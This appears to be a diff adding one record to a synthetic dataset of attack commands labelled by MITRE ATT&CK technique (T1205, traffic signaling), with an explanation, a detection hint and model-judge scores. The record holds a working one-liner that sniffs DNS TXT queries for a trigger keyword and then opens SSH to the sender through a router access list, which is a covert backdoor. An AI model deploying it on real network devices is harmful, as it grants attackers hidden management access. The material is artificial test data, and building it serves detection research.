@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo python3 -c 'from scapy.all import sniff,IP,UDP,DNS,DNSQR; import os; p=sniff(filter=\"udp dst port 53\", lfilter=lambda x: x.haslayer(DNS) and x[DNS].qd and x[DNS].qd.qtype==16 and b\"allow-mgmt\" in x[DNSQR].qname, count=1)[0]; os.system(f\"ciscoconf --apply \\\"ip access-list extended MGMT-DNS; permit tcp host {p[IP].src} any eq 22\\\" && (sleep 180; ciscoconf --apply \\\"ip access-list extended MGMT-DNS; no permit tcp host {p[IP].src} any eq 22\\\") &\")'",
+  "explanation": "Uses a covert DNS TXT query containing 'allow-mgmt' as a signal to open SSH for 3 minutes to the querying IP via ciscoconf. Requires sudo for packet capture.",
+  "rationale_steps": [
+    "Sniff DNS TXT requests and detect a keyword-based trigger (covert signal).",
+    "Temporarily permit SSH from the source IP and automatically revoke after 180s.",
+    "Avoids changing credentials; only ACLs are manipulated.",
+    "Detection: inspect DNS logs for anomalous TXT queries and correlate with ACL changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-7a393370-14a1e395",
+  "source_prompt_hash": "7a393370",
+  "timestamp_utc": "2025-09-30T06:01:37.763989Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, valid Python and shell syntax, correctly escaped inner quotes, and proper separators.",
+        "semantic_score": 4,
+        "semantic_justification": "It implements DNS TXT-based signaling to trigger a temporary SSH ACL via ciscoconf, aligning with T1205, but depends on scapy/ciscoconf availability, root sniffing, and being on-path or on a DNS host.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T17:50:13.513756Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid Python and Scapy syntax, and correct f-string usage with escaped inner quotes.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly implements T1205 Traffic Signaling by using a covert DNS TXT query as a signal to trigger a time-limited SSH access rule via a plausible network configuration tool, fully aligning with the technique's description and operational feasibility.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T17:50:53.045624Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
